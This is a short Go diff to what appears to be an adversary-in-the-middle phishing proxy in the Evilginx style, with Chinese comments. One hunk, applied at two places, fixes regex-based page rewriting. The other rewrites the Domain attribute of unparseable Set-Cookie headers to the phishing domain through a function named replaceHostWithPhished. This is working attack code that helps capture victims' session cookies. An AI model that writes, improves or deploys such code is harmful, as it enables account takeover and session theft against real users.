@@ -1293,7 +1293,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												submatches := rule.re.FindStringSubmatch(match)
 												result := evaluateExpr(rule.expr, submatches)
 												if result != "" {
-													return result
+													return strings.Replace(rule.replace, "[["+rule.expr+"]]", result, -1)
 												}
 												return match
 											})
@@ -1439,8 +1439,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// 解析 cookie（http.ParseCookie 返回切片）
 				parsedCookies, err := http.ParseCookie(rawCookie)
 				if err != nil {
-					// 解析失败时，直接保留原始 Set-Cookie 字符串
-					resp.Header.Add("Set-Cookie", rawCookie)
+					// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
+					modified := rawCookie
+					// 提取 Domain 属性值（不区分大小写）
+					domainMatch := regexp.MustCompile(`(?i)(;\s*Domain=)([^;]+)`)
+					if matches := domainMatch.FindStringSubmatch(rawCookie); len(matches) == 3 {
+						origDomain := strings.TrimSpace(matches[2])
+						phishDomain, ok := p.replaceHostWithPhished(origDomain)
+						if ok && phishDomain != origDomain {
+							modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
+						}
+					}
+					resp.Header.Add("Set-Cookie", modified)
 					continue
 				}
 
@@ -1694,7 +1704,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												submatches := rule.re.FindStringSubmatch(match)
 												result := evaluateExpr(rule.expr, submatches)
 												if result != "" {
-													return result
+													return strings.Replace(rule.replace, "[["+rule.expr+"]]", result, -1)
 												}
 												return match
 											})
